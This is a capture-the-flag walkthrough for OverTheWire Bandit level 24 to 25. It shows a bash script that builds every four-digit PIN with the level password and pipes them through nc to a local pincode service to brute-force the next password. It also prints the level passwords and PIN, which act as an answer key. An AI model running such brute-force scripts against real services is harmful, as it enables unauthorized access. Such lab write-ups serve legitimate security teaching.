Another simple challenge!
![Bandit24](https://github.com/sreekesari-vangeepuram/overthewire/blob/master/overthewire/bandit/bandit24/level24-%3Elevel25.png)

Let's see what we have to do:
```
bandit24@bandit:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
bandit24  6927  0.0  0.1  21148  4928 pts/0    Ss   13:45   0:00 -bash
bandit24  9309  0.0  0.1  21152  4960 pts/46   Ss   13:47   0:00 -bash
bandit24 17865  0.1  0.1  39632  7524 pts/0    S+   13:57   0:00 vim brute.sh
bandit24 21631  0.8  0.1  39764  7520 pts/46   S+   14:02   0:00 vim brut3.sh
bandit24 22292  0.0  0.0  23948  3540 pts/45   S+   13:34   0:00 nano dictionary.py
bandit24 22373  0.1  0.2  27728  9328 pts/3    S+   14:03   0:00 python3 pincode.py
bandit24 22858  0.0  0.1  21180  4996 pts/62   Ss+  13:35   0:00 -bash
bandit24 23613  0.8  0.1  21148  4824 pts/22   Ss   14:03   0:00 -bash
bandit24 23870  0.0  0.0  19188  2212 pts/22   R+   14:04   0:00 ps aux
bandit24 27657  0.2  0.6  49520 24876 ?        Ss   13:18   0:07 tmux
bandit24 27658  0.0  0.1  21188  5144 pts/45   Ss   13:18   0:00 -bash
bandit24 27669  0.0  0.1  21188  4828 pts/50   Ss   13:19   0:00 -bash
bandit24 27846  0.0  0.1  30712  8032 pts/50   S+   13:19   0:00 python
bandit24 28464  0.0  0.1  21168  5120 pts/3    Ss   13:20   0:00 -bash
bandit24@bandit:~$ mkdir /tmp/bruteforce
mkdir: cannot create directory ‘/tmp/bruteforce’: File exists
bandit24@bandit:~$ mkdir /tmp/bruteforce_for_banidt25
bandit24@bandit:~$ cd /tmp/bruteforce_for_banidt25
bandit24@bandit:/tmp/bruteforce_for_banidt25$ ls
bandit24@bandit:/tmp/bruteforce_for_banidt25$ nano combgen.sh
Unable to create directory /home/bandit24/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

bandit24@bandit:/tmp/bruteforce_for_banidt25$ ls
combgen.sh
bandit24@bandit:/tmp/bruteforce_for_banidt25$ chmod +x combgen.sh 
bandit24@bandit:/tmp/bruteforce_for_banidt25$ cat combgen.sh 
#!/bin/bash

for i in {0000..9999}
  do
    echo -e "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> combinations.txt
  done
bandit24@bandit:/tmp/bruteforce_for_banidt25$ ./combgen.sh 
bandit24@bandit:/tmp/bruteforce_for_banidt25$ ls
combgen.sh  combinations.txt
bandit24@bandit:/tmp/bruteforce_for_banidt25$ nano bruteforce.sh
Unable to create directory /home/bandit24/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

bandit24@bandit:/tmp/bruteforce_for_banidt25$ cat bruteforce.sh 
#!/bin/bash

cat ./combinations.txt | nc localhost 30002 | grep -n password
bandit24@bandit:/tmp/bruteforce_for_banidt25$ chmod +x bruteforce.sh 
bandit24@bandit:/tmp/bruteforce_for_banidt25$ ./bruteforce.sh 
1:I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
2591:The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
bandit24@bandit:/tmp/bruteforce_for_banidt25$
```

This is really cool challenge, where we are executing a real password cracking script. 
If you've practised alteast a bit of bash you might've got some idea on this.

Otherwise try to bruteforce with a code written in  Python or C from the remote-machine itself on the socket `localhost:30002`.
By-the-way the PINCODE is: `2588`.

Hope you've learnt something new from this [if you don't know this before/didn't strike to you during the start].

Now, let's use the password `uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG` to log into the remote-machine as `bandit25`.

**Warning: Please, first try Level 25 -> Level 26! Otherwise it's useless to simply cpy-pst the command[s]/password[s].
